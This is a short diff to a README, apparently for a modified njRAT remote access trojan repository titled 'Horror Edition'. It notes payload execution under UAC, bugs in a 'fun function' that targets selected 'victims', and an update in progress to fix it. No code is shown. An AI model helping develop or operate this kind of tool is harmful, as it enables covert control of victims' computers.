@@ -4,7 +4,9 @@
 
 .:: NOTE: Do not use UAC if you are already admin privileges or the payload will not execute
 
-.:: CURRENT BUGS: Fun function does not stay with its 1 victim. If you hilight a different victim while on fun then it will go to them.
+.:: CURRENT BUGS: Fun function does not stay with its 1 victim. If you hilight a different victim while on fun or select multiple then it will go to them. 
+
+.:: CURRENT UDPATE IN PROGRESS: Attempting to make fun function work properly. (each window effects 1 victim only)
 
 ![Screenshot](https://github.com/De-eloper/NjRat-0.7d-Horror-Edition/raw/main/Screenshot_.PNG?raw=true)
 
